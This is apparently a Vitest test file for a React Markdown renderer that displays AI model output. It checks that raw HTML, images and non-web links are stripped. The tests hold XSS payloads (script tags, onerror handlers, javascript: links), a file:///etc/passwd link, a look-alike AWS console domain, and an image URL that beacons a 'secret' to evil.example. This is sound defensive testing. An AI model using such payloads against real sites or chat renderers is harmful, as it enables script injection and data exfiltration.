import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import { Markdown, safeHref } from './Markdown'

const render = (text: string): string => renderToStaticMarkup(<Markdown text={text} onLink={() => {}} />)

describe('Markdown (model output)', () => {
  it('renders ordinary markdown, including GFM tables', () => {
    const html = render('**粗体** `code`\n\n| a | b |\n| - | - |\n| 1 | 2 |')
    expect(html).toContain('<strong>粗体</strong>')
    expect(html).toContain('<code>code</code>')
    expect(html).toContain('<table>')
  })

  it('drops raw HTML instead of rendering it', () => {
    const html = render('hi <script>alert(1)</script> <img src="https://evil.example/x.png" onerror="alert(1)"> <iframe src="https://evil.example"></iframe>')
    expect(html).not.toMatch(/<script|<img|<iframe|onerror/)
  })

  it('renders no images, so nothing can beacon out', () => {
    expect(render('![x](https://evil.example/track.png?d=secret)')).not.toContain('<img')
  })

  it('keeps only web links clickable', () => {
    const html = render('[console](https://ap-northeast-1.console.aws.amazon.com/ec2/home) [js](javascript:alert(1)) [file](file:///etc/passwd) [data](data:text/html,<b>x</b>)')
    expect(html).toContain('href="https://ap-northeast-1.console.aws.amazon.com/ec2/home"')
    expect(html).not.toMatch(/javascript:|file:|data:/)
    expect(html.match(/<a /g)).toHaveLength(1)
  })

  it('in cards, keeps only console links clickable and still drops HTML and images', () => {
    const html = renderToStaticMarkup(
      <Markdown
        consoleOnly
        onLink={() => {}}
        text={'[console](https://us-east-1.console.aws.amazon.com/billing/home) [web](https://evil.example/?d=1) [js](javascript:alert(1)) <script>alert(1)</script> ![x](https://evil.example/t.png)'}
      />
    )
    expect(html.match(/<a /g)).toHaveLength(1)
    expect(html).toContain('href="https://us-east-1.console.aws.amazon.com/billing/home"')
    expect(html).not.toMatch(/evil\.example|javascript:|<script|<img/)
    expect(safeHref('https://console.aws.amazon.com.evil.example/', true)).toBeNull()
  })

  it('safeHref accepts http(s) only', () => {
    expect(safeHref('https://example.com')).toBe('https://example.com')
    expect(safeHref('mailto:a@b.c')).toBeNull()
    expect(safeHref('/relative')).toBeNull()
    expect(safeHref(undefined)).toBeNull()
  })
})
